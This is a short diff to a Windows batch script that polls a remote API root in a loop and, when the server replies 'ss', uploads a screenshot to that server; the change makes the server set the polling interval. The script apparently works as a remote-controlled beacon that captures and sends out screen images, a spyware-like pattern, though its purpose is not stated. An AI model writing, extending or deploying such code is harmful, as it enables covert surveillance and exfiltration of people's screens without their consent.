@@ -12,6 +12,9 @@ powershell -Command "Unblock-File -Path 'nircmd.exe'"
 echo Download successful.
 echo API Root: %apiRoot%
 
+for /f "delims=" %%i in ('curl -s "%apiRoot%/conf/ping"') do set "waitTime=%%i"
+echo Ping interval: %waitTime% seconds
+
 :loop
 for /f "delims=" %%i in ('curl -s -X POST -d "name=%name%" "%apiRoot%/u"') do set "result=%%i"
 echo Response: %result%
@@ -23,5 +26,5 @@ if "%result%"=="ss" (
     curl -s -X POST -F "name=%name%" -F "image=@ss.jpg" "%apiRoot%/ss"
 )
 
-timeout /t 30 /nobreak >nul
+timeout /t %waitTime% /nobreak >nul
 goto loop
